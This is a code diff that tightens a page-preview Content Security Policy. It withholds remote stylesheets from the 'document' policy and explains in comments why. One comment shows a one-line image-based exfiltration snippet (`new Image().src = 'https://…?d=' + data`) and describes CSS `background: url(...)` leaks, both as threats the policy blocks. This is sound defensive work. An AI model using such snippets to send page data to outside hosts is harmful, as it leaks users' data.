@@ -44,7 +44,7 @@ export type PreviewPolicy = 'bundle' | 'document';
 
 const BASE_CSP = [
   "default-src 'none'",
-  "style-src 'unsafe-inline' https:",
+  "style-src 'unsafe-inline'",
   "frame-src 'none'",
   "form-action 'none'",
 ];
@@ -52,8 +52,12 @@ const BASE_CSP = [
 /// Remote fetches a previewed page may make for *display*. Allowed on
 /// `bundle`, withheld from `document`: on `document` every one of these is a
 /// one-line exfiltration channel (`new Image().src = 'https://…?d=' + data`)
-/// that `connect-src 'none'` does not govern.
+/// that `connect-src 'none'` does not govern. `style-src https:` is a display
+/// channel for the same reason — an attacker-hosted stylesheet can carry
+/// exfiltrated data as `background: url(...)` — so it lives here rather than
+/// in `BASE_CSP`.
 const REMOTE_DISPLAY_CSP = [
+  "style-src 'unsafe-inline' https:",
   'img-src data: blob: https:',
   'font-src data: https:',
   'media-src data: blob: https:',
